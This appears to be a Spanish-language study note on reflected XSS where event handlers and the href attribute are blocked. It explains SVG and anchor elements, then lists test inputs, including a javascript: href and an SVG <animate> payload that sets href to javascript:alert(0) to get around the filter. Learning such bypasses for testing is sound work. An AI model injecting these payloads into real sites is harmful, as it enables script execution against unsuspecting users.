# XSS con eventos y atributos bloqueados 

Tags: #XSS #XSS-Reflected 

```javascript
// El un formato gráfico vectorial SVG (Scalable Vector Graphics) es un lenguaje de estándar abierto que forma parte de HTML5 y permite crear dibujos vectoriales (formas, imagenes y texto) en 2D por medio de etiquetas

// El elemento HTML Anchor <a> crea un enlace a otras paginas de internet, archivos o ubicaciones dentro de la misma página, direcciones de correo, etc... 

// SVG es un lenguaje basado en XML para describir imágenes vectoriales
```

```javascript 
// En este entorno el atributo href esta bloqueado 

- Verificar si el campo es inyectable:

	<a href="">Click me</a>
	<a>Hola</a>
	<a href="javascript:alert(0);">Click me</a> 

	<svg><a><animate attributeName=href values=javascript:alert(0) /><text x=30 y=30>Click me!</text></a>


Notas:
	1. El atributo 'attributeName' indica el nombre de la propiedad CSS o el atributo del elemento target que va a ser cambiado durante una animación
	2. 'x' y 'y' se utilizan para dar el posicionamiento al texto 
```